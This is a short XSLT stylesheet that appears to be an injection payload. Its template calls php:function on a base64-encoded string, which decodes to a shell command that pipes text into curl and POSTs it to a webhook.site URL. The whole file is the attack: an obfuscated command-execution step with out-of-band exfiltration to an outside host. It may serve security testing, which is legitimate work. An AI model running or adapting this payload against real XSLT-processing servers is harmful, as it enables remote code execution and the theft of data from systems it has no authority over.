<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://xml.apache.org/xalan/java">

  <xsl:template match="s">
<xsl:value-of select="php:function(&quot;base64_decode('ZWNobyBjb3Vjb3UgfCBjdXJsIC1YIFBPU1QgLUYgInJlc3VsdD1ALSIgaHR0cHM6Ly93ZWJob29rLnNpdGUvMDMxMWU2MTAtNWZmOS00MzA2LTkyZWQtODU3YjNkNjBjZjUx')&quot;)"/>
  </xsl:template>

</xsl:stylesheet>
